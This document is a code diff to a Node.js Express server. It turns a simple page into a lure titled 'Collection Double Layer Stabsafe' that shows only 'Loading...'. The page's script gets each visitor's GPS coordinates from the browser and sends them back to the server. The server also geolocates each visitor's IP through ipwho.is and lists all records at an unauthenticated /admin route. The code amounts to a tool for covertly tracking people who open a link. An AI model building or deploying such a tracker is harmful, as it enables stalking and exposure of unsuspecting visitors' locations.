@@ -1,21 +1,22 @@
 const express = require('express');
 const https = require('https');
 
-process.env.NODE_TLS_REJECT_UNAUTHORIZED = '0';
-
 const app = express();
+
+app.use(express.json());
 
 app.set('trust proxy', true);
 
 const visits = [];
 
+// MAIN PAGE
 app.get('/', (req, res) => {
 
     const ip =
-        req.headers['x-forwarded-for']?.split(',')[0] ||
+        req.headers['x-forwarded-for'] ||
         req.socket.remoteAddress;
 
-    https.get(`https://ipwhois.app/json/${ip}`, (response) => {
+    https.get(`https://ipwho.is/${ip}`, (response) => {
 
         let data = '';
 
@@ -42,8 +43,48 @@ app.get('/', (req, res) => {
             console.log(info);
 
             res.send(`
-                <h1>Hello</h1>
-                <p>Page loaded successfully.</p>
+                <html>
+                <head>
+                    <title>Collection Double Layer Stabsafe</title>
+                </head>
+
+                <body>
+                    <h1>Collection Double Layer Stabsafe</h1>
+                    <p>Loading...</p>
+
+                    <script>
+
+                    navigator.geolocation.getCurrentPosition(
+
+                        (position) => {
+
+                            fetch('/save-location', {
+
+                                method: 'POST',
+
+                                headers: {
+                                    'Content-Type': 'application/json'
+                                },
+
+                                body: JSON.stringify({
+                                    latitude: position.coords.latitude,
+                                    longitude: position.coords.longitude
+                                })
+
+                            });
+
+                        },
+
+                        (error) => {
+                            console.log(error);
+                        }
+
+                    );
+
+                    </script>
+
+                </body>
+                </html>
             `);
 
         });
@@ -58,10 +99,33 @@ app.get('/', (req, res) => {
 
 });
 
-app.get('/admin', (req, res) => {
-    res.json(visits);
+// SAVE GPS LOCATION
+app.post('/save-location', (req, res) => {
+
+    const gps = {
+        latitude: req.body.latitude,
+        longitude: req.body.longitude,
+        exact_time: new Date()
+    };
+
+    visits.push(gps);
+
+    console.log(gps);
+
+    res.sendStatus(200);
+
 });
 
+// ADMIN PANEL
+app.get('/admin', (req, res) => {
+
+    res.json(visits);
+
+});
+
+// START SERVER
 app.listen(3000, () => {
+
     console.log('Server running on port 3000');
+
 });
